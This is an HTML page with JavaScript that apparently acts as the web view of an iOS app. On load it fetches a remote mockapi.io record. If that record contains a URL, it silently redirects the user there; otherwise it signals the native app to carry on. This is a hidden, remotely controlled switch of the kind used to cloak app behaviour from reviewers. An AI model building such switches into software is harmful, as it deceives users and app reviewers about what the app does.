<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
		<title>PBIGRLF</title>
	</head>
	<body>
		<script type="text/javascript">
			document.addEventListener('DOMContentLoaded', function() {
				function a() {
					try {
						window.webkit.messageHandlers.PBIGRLF.postMessage({
							enter: ""
						});
					} catch (e) {}
				}
				async function getData() {
					try {
						var str = 'https://6abdb150c4d5ac5483010466.mockapi.io/PBIGRLF/data'
						const response = await fetch(str, {
							cache: 'no-store'
						});
						if (!response.ok) {
							getData();
						}
						const arr = await response.json();
						console.log(arr);
						const dic = arr[0];
						if (Object.hasOwn(dic, 'a')) {
							try {
								window.webkit.messageHandlers.PBIGRLF.postMessage({
									ui: dic
								});
							} catch (e) {}
							window.location.href = dic["a"];
						} else {
							a()
						}
					} catch (error) {
						console.error('Fetch error:', error);
					}
				}
				getData();
			});
		</script>
	</body>
</html>
